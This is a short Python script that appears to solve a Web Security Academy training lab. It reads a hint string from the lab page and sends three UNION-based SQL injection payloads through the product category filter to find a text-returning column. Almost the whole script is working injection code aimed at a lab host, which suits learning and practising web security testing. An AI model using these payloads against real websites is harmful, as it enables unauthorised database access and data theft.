import requests
from bs4 import BeautifulSoup

s = requests.Session()

site = 'ace61f1d1e27f7a9c08c8c04007c0072.web-security-academy.net'

url= f'https://{site}/'
resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')
hint_text = soup.find(id='hint').get_text().split("'")[1]
print(f"Database needs to retrieve the string {hint_text}")

def try_category(category_string):
    url = f'https://{site}/filter?category={category_string}'
    resp = s.get(url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    print(soup)

try_category(f"""Corporate+gifts' UNION SELECT '{hint_text}',null,null -- """)
try_category(f"""Corporate+gifts' UNION SELECT null,'{hint_text}',null -- """)
try_category(f"""Corporate+gifts' UNION SELECT null,null,'{hint_text}' -- """)


